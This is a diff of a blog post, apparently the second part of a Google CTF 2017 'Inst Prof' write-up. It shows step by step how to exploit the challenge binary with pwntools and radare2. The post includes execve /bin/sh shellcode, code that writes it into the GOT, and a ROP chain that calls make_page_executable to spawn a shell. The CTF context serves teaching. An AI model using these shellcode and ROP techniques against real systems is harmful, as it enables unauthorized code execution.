@@ -6,7 +6,8 @@ date: 2017-09-24T18:56:18+02:00
 publishdate: 2017-10-25T18:56:18+02:00
 draft: true
 
-summary: "Once we have understood how the binary works (this was explained in part 1, we can move forward to understand how can we exploit this."
+summary: "Once we have understood how the binary works (this was explained in part 1, we can move forward to 
+understand how can we exploit this."
 cardthumbimage: "/assets/GoogleCTF2017/title.jpg"
 
 author:
@@ -30,15 +31,23 @@ tags:
 
 ---
 
-This post is the following part of [this one](../inst_prof_p1). Basically the analysis phase is already done, so we can focus outselves on the exploitation phase.
+#### Introduction
 
-#### Reminder
+This post is the second part of [Google CTF - Inst Prof 1](../inst_prof_p1).  
+Basically, the analysis phase is already done, so, in this post, we are going to focus with the exploitation 
+phase.
 
-Just to remember what we explained in [part 1](../inst_prof_p1), here is an easy list with the normal flow of the process:
+---
+
+#### Flash reminder
+
+Just to remember what we explained in [part 1](../inst_prof_p1), here is an easy list with the normal flow of 
+the process. Here is a [patched version of the binary](/assets/GoogleCTF2017/Inst Prof/inst_prof.patched) as 
+we explained in the part 1.
 
 1. It allocates a memory page of `0x1000` bytes with read and write privileges (remember the `PROT_READ | PROT_WRITE` stuff).
 
-2. It copies the following instructions inside of this page:  
+2. It copies the following instructions inside of this newly-allocated page:  
 {{< highlight r2 >}}
             0x7fd4a1197000      b900100000     ecx = 0x1000            
         ┌─> 0x7fd4a1197005      90                                     
@@ -46,11 +55,13 @@ Just to remember what we explained in [part 1](../inst_prof_p1), here is an easy
         |   0x7fd4a1197007      90                                     
         |   0x7fd4a1197008      90                                     
         |   0x7fd4a1197009      83e901         ecx -= 1                
-        └─< 0x7fd4a119700c      75f7           if (var) goto 0x7fd4a1197005 ; likely
+        └─< 0x7fd4a119700c      75f7           if (var) goto 0x7fd4a1197005
             0x7fd4a119700e      c3                                     
 {{< /highlight >}}
 
-3. Later on, it reads an input from `stdin` and uses the first `4 bytes` to overwrite the `nop` opcodes we saw in the previous point (those `90`). For example, if we input the character `\xc3` (which is the opcode for `ret` instruction) four times, we will get this:  
+3. Later on, it reads an input from `stdin` and uses the first `4 bytes` to overwrite the `nop` opcodes we 
+saw 
+in the previous point (those `90`). For example, if we input the character `\xc3` (which is the opcode for `ret` instruction) four times, we will get this:  
 {{< highlight r2 >}}
 $ r2 -Ad -R "stdin=\"`echo -ne "\xc3\xc3\xc3\xc3"`\"" -c 'dcu `/r sym.read_inst~[1]`; dso; pd 8 @ r:rbx;' inst_prof
             0x7f6b63902000      b900100000     ecx = 0x1000            
@@ -75,7 +86,8 @@ $ r2 -Ad -R "stdin=\"`echo -ne "\xc3\xc3\xc3\xc3"`\"" -c 'dcu `/r sym.read_inst~
 
 #### Objective
 
-So, our goal is to allocate an entire [shellcode](https://en.wikipedia.org/wiki/Shellcode) somewhere in memory and redirect the execution flow to it. We have some little problems regarding this:
+So, our goal is to allocate an entire [shellcode](https://en.wikipedia.org/wiki/Shellcode) somewhere in 
+memory and redirect the execution flow to it. We have some little problems regarding this:
 
 1. We have to do it using instructions formed with 4 bytes as max (remember the process will only read 4 bytes each time you send something).
 
@@ -101,13 +113,16 @@ p = process("./inst_prof")
 p = remote("inst-prof.ctfcompetition.com", 1337)
 ```
 
-2. Instead of sending the opcodes directly we can use the `asm()` instruction. Remember that we should tell `pwntools` which architecture and operating system we are expecting. We do this through the `context()` instruction. An example of this would be:  
+2. Instead of sending the opcodes directly we can use the `asm()` method. Have in mind we should tell 
+`pwntools` which architecture and operating system we are expecting. We do this through the `context()` 
+method. An example of this would be:  
 ```python
 context(arch='amd64', os='linux')
 p.send(asm('mov r13, [rsp]'))
 ```
 
-All right, so first we need a shellcode. I am using this one, but you can search for [another](https://www.google.com/search?q=shellcode+bin+sh+x64+linux) if you want (have in mind that not all of them works).
+All right, so first we need a shellcode. I am using [my own](/assets/GoogleCTF2017/Inst Prof/shellcode.asm), but 
+you can search for [another](https://www.google.com/search?q=shellcode+bin+sh+x64+linux) if you want (have in mind that not all of them works).
 ```python
 shellcode = (
     "\xb0\x3b\x99\x48\xbb\x2f"
@@ -140,12 +155,15 @@ Four bytes. That means that we cannot apply a `ret` instruction.
             0x7f556238a00e      c3                     
 {{< /highlight >}}
 
-So the loop will write `4096` times `0xb0` on the same address. Fair enough, it is a waste of cycles but it will work.  
-This way we can copy the 23 bytes of the shellcode.
+So the loop will write `4096` times `0xb0` on the same address. Fair enough, it is a waste of cycles but it will 
+work. This way we can copy the 23 bytes of the shellcode.
 
-We need to know a couple more things are:
+We still need to know a couple things more:
 
-**1.** an initial **address** where to start writing our shellcode. Ideally, we would want to use a memory area with `write` and `execution` permissions, but there is none. So I will use a section that has at least `write` permissions like the [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) section.
+**1.** an initial **address** where to start writing our shellcode to. Ideally, we would want to use a memory area 
+with `write` and `execution` permissions, but there is none. So we will use a section that has at least `write` 
+permissions like the [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) section and we will deal with the 
+execution permission later.
 
 {{< highlight r2 "hl_lines=3" >}}
 [0x5569ad584b18]> dm~rwx
@@ -165,7 +183,9 @@ usr   132K 0x00007ffd4fb3c000 - 0x00007ffd4fb5d000 s -rw- [stack] [stack] ; map.
 
 In this case `0x00005569ad786000` is the address we are looking for **BUT** remember `PIC` flag is enabled so our executable will be loaded at a random address each time it will be launched.
 
-This is a problem that can be solved thinking that even being loaded at a different place, **THE DISTANCE** between some specific points will always be the same. We will take the first value the `rsp` register is pointing to (which is going to be a return address, the address right after the `call rbx` instruction).
+This is a problem that can be solved thinking that even being loaded at a different place, **THE DISTANCE** between 
+some specific points will always be the same. We will take the value the `rsp` register is pointing to (which is 
+going to be a return address, the address right after the `call rbx` instruction).
 
 {{< highlight r2 "hl_lines=4" >}}
 [0x558cfc7d3b16 230 /root/inst_prof]> pd $r @ hit0_0
@@ -183,15 +203,24 @@ and get the difference between that address and the address of the GOT.
 2102504 0x2014e8 010012350 2M 20000:04e8 2102504 "\xe8\x14 " 001000000001010011101000 2102504.0 2102504.000000f 2102504.000000
 ```
 
-This way we will not need to worry about where is the `GOT` located: it will always be at `[rsp] + 0x2014e8`. We will need to generate that value and save it into a register.
+This way we will not need to worry about where is the `GOT` located: it will always be at `[rsp] + 0x2014e8`. We 
+will need to generate that value on runtime and save it into a register. Once it will be generated, we will use it 
+to store our shellcode there.
 
-**2.** and a **register** to store that address.
+**2.** and we will need a **register** to store that generated address.
 
-To know which registers we can use, we will stop the execution just before the first 4 input bytes, alter some registers (I did this using `r13`, `r14` and `r15` but you can use the ones you want, just remember you will maybe need the values of the rest of the registers to generate `0x2014e8`), read another 4 bytes and check if any of them have been changed.
+But we can not use one the register we want because is possible it is going that the process is using it to do 
+other stuff and we dont want to crash the program for being careless.  
+To know which registers we can use, we will:
 
-{{< highlight r2 "hl_lines=11 19" >}}
-$ r2 -Ad -R "stdin=\"`python -c 'print(\"\xc3\" * 8)'`\"" -c 'dcu main; db `/a call rbx~[0]`; dc; 2ds; dr r13=0x1111; dr r14=0x2222; dr r15=0x3333; Vpp' inst_prof
-[0x7f166f142000 230 /root/inst_prof]> ?0;f tmp;s.. @ rbx
+1. stop the execution just before the first 4 input bytes
+
+2. alter some registers (I altered `r13`, `r14` and `r15` but you can try the ones you want, just remember you will maybe need the values of these registers to generate `0x2014e8`),
+
+3. and read another 4 bytes to check if after one loop any of our chosen registers have been changed.
+
+{{< highlight r2 "hl_lines=12 20" >}}
+$ r2 -Ad -R "stdin=\"`python -c 'print(\"\xc3\" * 8)'`\"" -c 'dcu main; db `/a call rbx~[0]`; dc; ds 2; dr r13=0x1111; dr r14=0x2222; dr r15=0x3333; Vpp' inst_prof
 - offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
 0x7fffb7fbd398  182b c6a0 6755 0000 a02c f36e 167f 0000  .+..gU...,.n....
 0x7fffb7fbd3a8  0000 0000 0000 0000 0000 0000 0000 0000  ................
@@ -218,20 +247,25 @@ orax 0xffffffffffffffff
 {{< /highlight >}}
 
 > `r2 -Ad ... inst_prof`: Analyze and open for debugging the specified binary.  
-``-X "stdin=\"`python -c 'print(\"\xc3\" * 8)'`\""``: This is just to generate 8 `\xc3` bytes for the standard input.  
+``-R "stdin=\"`python -c 'print(\"\xc3\" * 8)'`\""``: This is just to generate 8 `\xc3` bytes for the standard 
+input.  
 ``dcu main``: Execute until `main` is reached.  
-``db `/a call rbx~[0]` ``: Once `main` is reached we can search for the address of the `call rbx` instruction  
-``dc; 2ds;``:  
+``db `/a call rbx~[0]` ``: Once `main` is reached, we can search for the address of the `call rbx` instruction and 
+place a breakpoint there
+``dc; 2ds;``: We continue the execution with `dc` until we reach the breakpoint we've just set and we move 2 
+instructions from there.
 ``dr r13=0x1111; dr r14=0x2222; dr r15=0x3333;``: change the values of 3 registers.  
 `Vpp`: To activate visual mode.
 
 In short, with the latest command we are sending two inputs of `4 bytes` each. These 4 bytes groups are `\xc3\xc3\xc3\xc3`, which means 4 `ret` instructions.
 
-With the first input, we are stopped at the first `ret` opcode. Once there, we change the value of some registers (I choose some of them to not do this longer than necessary) and resume the flow execution.
+With the first input, we stop at the first `ret` opcode and once there, we change the value of some registers and resume the flow execution.
 
 If the values of the registers we modified are the same in the next iteration of `do_test`, it will mean those registers are reliable to be used in our exploit. 
 
-Press `:` and type `dc;ds` now. We are in the next iteration of the loop with the following 4 bytes. As you may see, `r13` `r14` and `r15` has the same values, so we can assume we can use those 3 registers in our exploit.
+After activating the visual mode with `Vpp`, press `:` and type `dc;ds` now. We are in the next iteration of the 
+loop with the following 4 bytes. As you see, `r13` `r14` and `r15` has still the same values, so we can assume we 
+can use those 3 registers in our exploit.
 {{< highlight r2 "hl_lines=10" >}}
 [0x7fa647873000 230 /root/inst_prof]> ?0;f tmp;s.. @ rbx 
 - offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
@@ -248,7 +282,14 @@ Press `:` and type `dc;ds` now. We are in the next iteration of the loop with th
 orax 0xffffffffffffffff               
 {{< /highlight >}}
 
-All right, lets see what is the initial values of all the registers and think how we can generate the value `0x2014e8`, add it to `[rsp]` and save it in one of our three registers (`r13`, `r14` or `r15`).
+---
+
+#### Ufff.. alright! what's next?
+
+Now it is time to find out how we generate the magic value `0x2014e8`. To do that, lets see which values we have at 
+our disposal checking the registers at the first iteration of `do_test`.  
+Once we get it we will add that value to `[rsp]` (not rsp but the value it points too) and save it in one of our 
+three registers (`r13`, `r14` or `r15`) to use it later.
 
 {{< highlight r2 "hl_lines=5" >}}
 $ r2 -Ad -R "stdin=\"`python -c 'print(\"\xc3\" * 8)'`\"" -c 'dcu main; dcu `/a call rbx~[0]`; ds; dr=' inst_prof
@@ -265,51 +306,56 @@ I started like this:
 ```python
 ret = asm('ret')                            # "\xc3"
 
-# We store the return address at r13
-p.send(asm('mov r13, [rsp]'))               # "\x4c\x8b\x2c\x24"
+# We store the content rsp is pointing to in r13.
+p.send(asm('mov r13, [rsp]'))               # "\x4c\x8b\x2c\x24" 4 bytes! so we can not append a ret instrucction. 
+# This is going to be executed 0x1000 times which is not going to suppose a problem.
 
 # We need to get 0x2014e8 and add it to r13
 p.send(asm('add r15, 0x20'))                # "\x49\x83\xc7\x20" -> r15 = 0x20 * 0x1000 -> 0x20000
-# Remember that the instruction will be executed 0x1000 times if we do not add a "ret" opcode
-# (and we can not do it due because it is a 4-byte instruction.)
+# Again, remember that the instruction will be executed 0x1000 times if we do not add a "ret" opcode.
+# This way we are going to store 0x20 * 0x1000 (0x20000) in r15.
 
 # We send 0x10 times the next instruction.
 # Each of this sends will not be executed 0x1000 times because we are adding a `ret` opcode.
 inst = asm('add r14, r15') + ret
 for i in range(0x10):
     p.send(inst)       # "\x4d\x01\xfe" + "\x3c"; r14 = 0x200000
+# It has a ret instrucction attached so it will only going to get executed once each sending.
+# r14 has a initial value of 0x0 so adding to 0x0 0x10 times 0x20000 will result in 0x200000!
 
-# r10 is 0x487. If we add it 0x9D times to r14 we get...
+# r10 is initially 0x487. If we add it 0x9D times to r14 we get ...
 inst = asm('add r14, r10') + ret            # "\x4d\x01\xd6" + "\x3c"
 for i in range(0x9D):
     p.send(inst)                            # r14 = 0x2014da ! We are pretty close
 
-# Adding 0xE 
+# We only need an extra 0xE so ...
 inst = asm('inc r14') + ret                 # "\x49\xff\xc6" + "\xc3"
 for i in range(0xE):
     p.send(inst)                            # r14 = 0x2014e8 !!
 
-# r13 = [rsp] + 0x2014e8 = GOT TABLE
+# Ta-dahhh! Now we add r13 (which have [rsp])  and ... 
 p.send(asm('add r13, r14') + ret)           # "\x4d\x01\xf5" + "\xc3"; 
+# r13 = r13 + 0x2014e8 = GOT TABLE !! 
 ```
 
-Obviously, there is some data at the beginning of GOT section and we can avoid overwritting it. That's the reason of the following lines.
+Obviously, there is some data at the beginning of the GOT section. We should avoid overwritting it. That's the 
+reason of the following lines.
 ```python
-# We make a copy of the initial address of the GOT
+# We make a copy of the initial address of the GOT in r14
 p.send(asm('mov r14, r13') + ret)           # "\x4d\x89\xee" + "\xc3";
 
-# We add 0x80 to that copied address
+# We add 0x80 to r14 to point aheader, not the values we do not want to overwrite.
 inst = asm('inc r14') + ret                 # "\x49\xff\xc6" + "\xc3"; 
 for i in range(0x80):
     p.send(inst)
 
-# Copy of the address + 0x80.
-# We need this copy to increment it as we copy each byte of the shellcode into memory
+# Copy of the address + 0x80 to r15.
+# We will need this copy to use it as an iterator to copy each byte of the shellcode into memory.
 p.send(asm('mov r15, r14') + ret)           # "\x4d\x89\xf7" + "\xc3";
 
 ```
-
-When the execution of this script reach this point, the value of `r13`, `r14` and `r15` will be:
+Dont get lost. Briefly, when the execution of this script reach this point, the value of `r13`, `r14` and `r15` 
+is going to be:
 
 1. `r13` = Beginning of GOT
 
@@ -317,8 +363,9 @@ When the execution of this script reach this point, the value of `r13`, `r14` an
 
 3. `r15` = GOT + 0x80 = Start address of our shellcode
 
-> Why `r14` and `r15` has the same value?
-It is just because we will increment `r15` one by one to use it to write each byte of the shellcode and we will need the initial value later.
+> mmmh repeat me again, why `r14` and `r15` has the same value?
+It is just because we will increment `r15` one by one and use it to write each byte of the shellcode but we 
+will still need to know its initial value to say: "Hey you! start executing instructions at this point please".
 
 At this point we want to write the entire shellcode at a register (`r14` or `r15`) incrementing it by one each time one of the bytes of the shellcode is stored.
 ```python
@@ -331,7 +378,7 @@ def writeByteString(str):
         p.send(inc_r15)                     # inc r15    
 ```
 
-Up at this point the registers are as follows:
+When we execute that function with the shellcode as argument the registers will be as follows:
 
 1. `r13` = Beginning of GOT
 
@@ -339,35 +386,257 @@ Up at this point the registers are as follows:
 
 3. `r15` = GOT + 0x80 + 0x23 = End address of our shellcode
 
-Lets check all this code and show the memory of the process with r2 to ensure that our shellcode is there. [partial_solve.py](/assets/GoogleCTF2017/Inst Prof/solve1.py).
+Lets check all this code and show the memory of the process with r2 to ensure that our shellcode is there. 
+[solve1.py](/assets/GoogleCTF2017/Inst Prof/solve1.py).
 ```bash
 $ ./solve1.py
 [+] Starting local process './inst_prof': pid 17632
 initializing prof...ready
 ```
 
-Once the script is initiated we open a new terminal and attach radare2 to the process and check if our shellcode has been inserted correctly.
-{{< highlight r2 "hl_lines=9 10 11" >}}
-$ r2 -d 17632
-[0x55a0906d3070]> pxq @ section..got.plt 
-0x55a0906d3000  0x0000000000201e08  0x00007f374aecf170   .. .....p..J7...
-0x55a0906d3010  0x00007f374acbfcc0  0x00007f374a9e8710   ...J7......J7...
-0x55a0906d3020  0x00007f374a9f13c0  0x000055a0904d17d6   ...J7.....M..U..
-0x55a0906d3030  0x00007f374a9e86b0  0x00007f374a92d1f0   ...J7......J7...
-0x55a0906d3040  0x000055a0904d1806  0x00007f374a9f1490   ..M..U.....J7...
-0x55a0906d3050  0x00007f374a9f14c0  0x000055a0904d1836   ...J7...6.M..U..
-0x55a0906d3060  0x000055a0904d1846  0x000055a0904d1856   F.M..U..V.M..U..
-0x55a0906d3070  0x4850ec8948c03148  0x69622fffbb48e289   H1.H..PH..H../bi
-0x55a0906d3080  0x08ebc14868732f6e  0x89485250e7894853   n/shH...SH..PRH.
-0x55a0906d3090  0x3bb0e689485750e2  0x000000000000050f   .PWH...;........
-0x55a0906d30a0  0x0000000000000000  0x0000000000000000   ................
-0x55a0906d30b0  0x0000000000000000  0x0000000000000000   ................
-0x55a0906d30c0  0x0000000000000000  0x0000000000000000   ................
-0x55a0906d30d0  0x0000000000000000  0x0000000000000000   ................
-0x55a0906d30e0  0x0000000000000000  0x0000000000000000   ................
-0x55a0906d30f0  0x0000000000000000  0x0000000000000000   ................
+Once the script is initiated we open a new terminal, attach radare2 to the process and check if our shellcode has 
+been inserted correctly.
+{{< highlight r2 "hl_lines=11 12" >}}
+$ r2 -d 21370
+[0x7f5ac270fa61]> pxq @ section..got.plt 
+0x55aaeef73000  0x0000000000201e08  0x00007f5ac2c06100   .. ......a..Z...
+0x55aaeef73010  0x00007f5ac29f5db0  0x00007f5ac270faf0   .]..Z.....p.Z...
+0x55aaeef73020  0x00007f5ac2719050  0x000055aaeed717d6   P.q.Z........U..
+0x55aaeef73030  0x00007f5ac270fa50  0x00007f5ac2648e80   P.p.Z.....d.Z...
+0x55aaeef73040  0x000055aaeed71806  0x00007f5ac2719140   .....U..@.q.Z...
+0x55aaeef73050  0x00007f5ac2719170  0x000055aaeed71836   p.q.Z...6....U..
+0x55aaeef73060  0x000055aaeed71846  0x000055aaeed71856   F....U..V....U..
+0x55aaeef73070  0x0000000000000000  0x000055aaeef73078   ........x0...U..
+0x55aaeef73080  0x69622fbb48993bb0  0x54535268732f2f6e   .;.H./bin//shRST
+0x55aaeef73090  0x00050f5e5457525f  0x0000000000000000   _RWT^...........
+0x55aaeef730a0  0x0000000000000000  0x0000000000000000   ................
+0x55aaeef730b0  0x0000000000000000  0x0000000000000000   ................
+0x55aaeef730c0  0x0000000000000000  0x0000000000000000   ................
+0x55aaeef730d0  0x0000000000000000  0x0000000000000000   ................
+0x55aaeef730e0  0x0000000000000000  0x0000000000000000   ................
+0x55aaeef730f0  0x0000000000000000  0x0000000000000000   ................
+{{< /highlight >}}
+
+Nice! the shellcode is inserted.  
+Now we only need to make that memory zone executable and redirect the flow to `r14`, where our shellcode lives on.
+
+---
+
+#### Make a page executable? Is that even possible?
+Well, normally is a bit more complicated than here. Thankfully, we have a function called `sym.make_page_executable()` which receives an 0x1000-aligned address.
+
+{{< highlight r2 "hl_lines=2" >}}
+[0x7f8137df2a61]> aaa;afl~make
+0x55c877154a20    1 20           sym.make_page_executable
+{{< /highlight >}}
+
+Again, we need to calculate this address at runtime since it will change on every execution.  
+We will calculate the difference between `sym.make_page_executable()` and `[rsp]`, just like we did 
+previously with the `GOT`.
+
+Once we have calculated this second the address, we will insert it on a specific position of the stack to redirect 
+the flow. Remember that `sym.make_page_executable()` needs a 0x1000-aligned address. We will use the address of the 
+`GOT` which is always aligned to that number. Look:
+
+{{< highlight r2 "hl_lines=5" >}}
+[0x7f8137df2a61]> dr~r1
+r10 = 0x00000022
+r11 = 0x00000246
+r12 = 0x7f81382e6009
+r13 = 0x55c877356000
+r14 = 0x55c877356080
+r15 = 0x55c877356097
 {{< /highlight >}}
 
 
-Nice! the shellcode is inserted
-#### References
+We want to send the address stored in `r13`. As we see in the [first part 1](../inst_prof_p1) the calling 
+convention for a 64 bit arquitecture states that:
+
+> The first six arguments [of a function] are passed in registers **RDI**, **RSI**, **RDX**, **RCX**, **R8**, and 
+**R9**.
+
+> the return value is stored in **RAX** and **RDX**.
+
+Then we need to move `r13` to `RDI`. Something like:
+```python
+p.send(asm("mov rdi, r13"))
+```
+
+The instruction only has a 3-bytes opcode
+
+```bash
+$ rasm2 -a x86 -c 64 'mov rdi, r13'
+4c89ef
+```
+
+The problem is that we need an iteration in the loop to do that, **BUT** `RDI` will be overwritten by the time 
+we get to the second iteration. What could we do then?
+
+The answer is [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming).  
+Basically we are going to re-use existent instructions of the process to alter the `RDI` value, jump from there 
+to `sym.make_page_executable()` and from there to our shellcode. The instruction - or how they are called: ROP 
+Gadget - we are going to re-use is:
+
+```asm
+pop rdi
+ret
+```
+
+We have to find out the address of that gadget, write its address in the stack overwritting the current return 
+address of the current stack frame and right after it, push the value we want to store 
+
+How do we find the address of the ROP gadget? Luckily, r2 has a very handful command to accomplish this task.
+
+{{< highlight r2 >}}
+$ r2 -Ad -c 's main; "/R pop rdi;ret"' -d inst_prof
+0x55f78b7bdbc3                 5f  pop rdi
+0x55f78b7bdbc4                 c3  ret
+{{< /highlight >}}
+> `-Ad`: we already know that `A` stands for `Analyze` and `d` is for open for debugging.
+
+> `-c` just passes the commands directly to r2. We want to positioned ourselves in the `main` function (`s 
+main`) and search for our desired gadget `"/R pop rdi;ret"`.
+
+Ok! so there we will have to write the following data in the stack:
+
+```bash
+   ----------------------------------------------------------------------
+                            address of the ROP gadget                   
+   ----------------------------------------------------------------------
+                  value we want to send to make_page_executable         
+                        which is the address of the GOT                 
+   ----------------------------------------------------------------------
+                         address of make_page_executable                
+   ----------------------------------------------------------------------
+```
+
+We can write these wherever we want to into the stack, just have in mind they need to survive to several calls 
+of `sym.do_test()`. I decided to use the following addresses:
+
+```bash
+   ----------------------------------------------------------------------
+    rsp + 24  │              address of the ROP gadget             │ 
+   ----------------------------------------------------------------------
+    rsp + 32  │    value we want to send to make_page_executable   │ r13
+              │         which is the address of the GOT            │ 
+   ----------------------------------------------------------------------
+    rsp + 40  │           address of make_page_executable          │ 
+   ----------------------------------------------------------------------
+```
+
+Once again, remember that we need to calculate the addresses on-runtime. Not the four of them, because we 
+already have address of the GOT in `r13` and the address of our shellcode in `r14`.
+
+We only have `r15` free, so we are going to save `r13` in `rsp + 32` at first place to be able to use it too.
+
+{{< highlight python "hl_lines=7 8 9" >}}
+# 1) rsp + 32 -> GOT table address (r13)
+p.send(asm('mov r15, rsp') + ret)        # "\x49\x89\xe7" + ret
+
+inst = asm('inc r15') + ret              # "\x49\xff\xc7" + ret
+for i in range(32):
+    p.send(inst)
+p.send(asm('mov [r15], r13') + ret)      # \x4d\x89\x2f + ret
+# :> pxq 8 @ rsp+32
+# 0x7ffde1355c48  0x000055664a259000                       ..%JfU..
+{{< /highlight >}}
+
+All right, lets go with the address of `sym.make_page_executable()` at `rsp + 40`
+
+{{< highlight r2 >}}
+$ r2 -Ad -R "stdin=\"`python -c 'print(\"\xc3\" * 8)'`\"" -c 'dcu main; db `/a call rbx~[0]`; dc; ds 2' inst_prof
+[0x7fbf976e6005]> ? sym.make_page_executable - [rsp]
+-248 0xffffffffffffff08 01777777777777777777410 17179869184.0G fffff000:0f08 -248 
+"\b\xff\xff\xff\xff\xff\xff\xff" 1111111111111111111111111111111111111111111111111111111100001000 -248.0 
+-248.000000f -248.000000
+{{< /highlight >}}
+
+All right, so it seems that `sym.make_page_executable() = [rsp] - 248`
+
+{{< highlight python "hl_lines=10 11 12" >}}
+# 2) rsp + 40 -> addr make executable
+p.send(asm('mov r13, [rsp]'))               # "\x4c\x8b\x2c\x24"
+inst = asm('dec r13') + ret
+for i in range(248):
+    p.send(inst)                            # "\x49\xff\xcd" + ret
+p.send(asm('mov r15, rsp') + ret)           # "\x49\x89\xe7" + ret
+inst = asm('inc r15') + ret
+for i in range(40):
+    p.send(inst)                            # "\x49\xff\xc7" + ret
+p.send(asm('mov [r15], r13') + ret)         # "\x4d\x89\x2f" + ret
+# :> pxq 8 @ rsp+24
+# 0x7ffde1355c40  0x000055664a057a20                        z.JfU..
+{{< /highlight >}}
+
+`rsp + 32` .. `rsp + 40` .. and now we go for `rsp + 24`. We have to write there the address of the ROP 
+gadget. Lets calculate the distance.
+
+{{< highlight r2 "hl_lines=7" >}}
+$ r2 -Ad -R "stdin=\"`python -c 'print(\"\xc3\" * 8)'`\"" -c 'dcu main; db `/a call rbx~[0]`;' inst_prof
+[0x5590dcff1860]> dc
+initializing prof...ready
+hit breakpoint at: 5590dcff1b16
+[0x5590dcff1b16]> ds 2
+[0x7fd31ab7f005]> ? 0x5590dcff1bc3 - [rsp]
+171 0xab 0253 171 0000:00ab 171 "\xab" 10101011 171.0 171.000000f 171.000000
+{{< /highlight >}}
+
+The ROP gadget is `0xab` bytes away from `[rsp]`, or the return address.
+
+{{< highlight python "hl_lines=10" >}}
+# 3) rsp + 24 -> ROP pop rdi + ret
+p.send(asm('mov r13, [rsp]'))              # "\x4c\x8b\x2c\x24"
+inst = asm('inc r13') + ret
+for i in range(0xab):
+    p.send(inst)                           # "\x49\xff\xc5" + ret
+p.send(asm('mov r15, rsp') + ret)          # "\x49\x89\xe7" + ret
+inst = asm('inc r15') + ret
+for i in range(24):
+    p.send(inst)                           # "\x49\xff\xc7" + ret
+p.send(asm('mov [r15], r13') + ret)        # "\x4d\x89\x2f" + ret
+# :> pxq 8 @ rsp+24
+# 0x7ffe34edf120  0x0000562f517c0bc3                       ..|Q/V..
+{{< /highlight >}}
+
+At this point we only have to do a few more things.  
+First, we set the `return address` to the address of our `ROP gadget`, just to redirect the flow of the program 
+after end the current function. Something like `rsp = rsp + 24`.
+
+Lets calculate `r15 = rsp + 24`.
+{{< highlight python >}}
+p.send(asm('mov r15, rsp') + ret)        # "\x49\x89\xe7" + ret
+inst = asm('inc r15') + ret
+for i in range(24):
+    p.send(inst)                         # "\x49\xff\xc7" + ret
+{{< /highlight >}}
+
+And once it is calculated, we use it to update the value of `rsp`:
+{{< highlight python >}}
+p.send(asm('mov rsp, r15') + ret)        # "\x4c\x89\xfc" + ret
+{{< /highlight >}}
+
+And finally we only need to redirect the flow to our shellcode!
+{{< highlight python >}}
+p.send(asm('mov [rsp], r14'))            # "\x4c\x89\x34\x24"
+p.interactive()
+{{< /highlight >}}
+
+
+Answer: CTF{0v3r_4ND_0v3r_4ND_0v3r_4ND_0v3r}
+
+### Solve video
+
+<a href="https://asciinema.org/a/R71WGFkZWEyonqfK5DLf0l5UN?autoplay=1">
+  <img src="https://asciinema.org/a/R71WGFkZWEyonqfK5DLf0l5UN.png"/>
+</a>
+
+### References and tools used:
+
+ * [radare2](https://github.com/radare/radare2) - To analyze the binary.
+ * [asciinema](https://asciinema.org) - To record the session.
+ * [BinaryStud.io](https://binarystud.io/googlectf-2017-inst-prof-152-final-value.html) - Another solution using r2!
+ * [python](https://www.python.org/) and [pwntools](https://github.com/Gallopsled/pwntools) - To code the 
+exploitation phase.
+ * [shellcode](https://en.wikipedia.org/wiki/Shellcode) - Shellcode explanation.
+ * [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) - Global Offset Table explanation.
+ * [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) - Return Oriented Programming.
